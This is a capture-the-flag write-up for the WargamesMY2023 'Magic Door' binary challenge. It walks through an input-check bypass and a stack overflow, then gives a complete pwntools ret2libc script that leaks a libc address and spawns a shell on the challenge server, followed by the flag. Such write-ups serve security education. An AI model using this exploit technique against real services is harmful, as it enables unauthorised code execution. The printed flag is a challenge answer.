---
title : "Magic Door [pwn]"
categories: WargamesMY2023
---

Classic ret2libc

[magic-door.zip]({{ site.url }}/files/wgmy2023/magic-door.zip){: .btn .btn--info}

# Solution

This challenge was pretty straightforward. Opening the binary in Ghidra, we see the decompilation

```c
  ...
  printf("Which door would you like to open? ");
  __isoc99_scanf(0x4020c4,local_18);
  getchar();
  iVar1 = strcmp(local_18,"50015");
  if (iVar1 == 0) {
    no_door_foryou();
  }
  else {
    local_c = atoi(local_18);
    if (local_c == 0xc35f) {
      magic_door(0xc35f);
    }
    else {
      no_door_foryou();
    }
  }
  ...
```

This is the first stage, which is to provide an input not equal to the string "50015", but `atoi()` gives "50015". There are several ways in achieving this: adding whitespaces in front, or non-digit characters at the end. I chose to input "50015a".

In `magic_door`, we see a buffer of size `0x48`, but `fgets` allows up to `0x100` bytes. On top of this, `checksec` gives no PIE, no stack canary. So, this is just simple ROP. However, realise that there are no `win` functions nor `system` used in the binary, so we will have to do return-to-libc (ret2libc) to call `system("/bin/sh")` ourselves.

As for the gadget to populate the parameter, I used `ROPgadget` to find:

```
root@77d7b624b28f:~/ctfs/magic-door# ROPgadget --binary magic_door
Gadgets information
============================================================
...
0x0000000000401434 : pop rdi ; ret
0x000000000040101a : ret
...
```

The flow of our exploit will be as follows:

First chain:
1. Call `puts` to print the address of `puts` in the GOT (global offset table). This will give us the address of `puts` in libc.
2. Go back to `magic_door` to send our second chain.

This is to help us get the libc base address to defeat ASLR, so that we can calculate the address of `system`. With the address leaked, we can substract the offset in libc from it to get the libc address.

With the base, we can also calculate the address of "/bin/sh" which can be found in libc.

Second chain:
1. Call `system` with "/bin/sh" 
2. (I inserted a `ret` before going into `system` because of stack alignment stuff)

With a shell, we just `cat flag.txt` to obtain the flag.

# Final Script
```python
#!/usr/bin/env python3

from pwn import *

exe = ELF("magic_door_test_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.35.so")

context.binary = exe

puts_got = exe.got["puts"]
puts_libc = libc.sym["puts"]

puts = exe.sym["puts"]
magic_door = exe.sym["magic_door"]

pop_rdi_ret = 0x0000000000401434
ret = 0x000000000040101a

def conn():
    if args.LOCAL:
        context.log_level = "debug"
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("13.229.84.41", 10002)

    return r


def main():
    r = conn()
    pause()

    r.sendlineafter(b"? ", b"50015a")

    padding = b"A" * 0x40 + b"B" * 8
    
    payload = padding \
            + p64(pop_rdi_ret) + p64(puts_got) + p64(puts) \
            + p64(magic_door)

    assert(len(payload) <= 0x100)
    r.recvline()
    r.recvline()
    r.sendline(payload)
    
    leaked_addr = r.recvline(keepends=False)
    puts_addr = int.from_bytes(leaked_addr, "little")

    libc.address = puts_addr - puts_libc
    info("libc base: " + hex(libc.address))
    
    system = libc.sym["system"]
    bin_sh = next(libc.search(b"/bin/sh"))
    
    info("system: " + hex(system))
    info("/bin/sh: " + hex(bin_sh))
    
    payload = padding \
            + p64(pop_rdi_ret) + p64(bin_sh) + p64(ret) + p64(system)
    
    r.recvline()
    r.recvline()
    r.sendline(payload)

    r.interactive()


if __name__ == "__main__":
    main()
```

Flag: `wgmy{4a029bf40a28039c8492acfa866f8d96}`
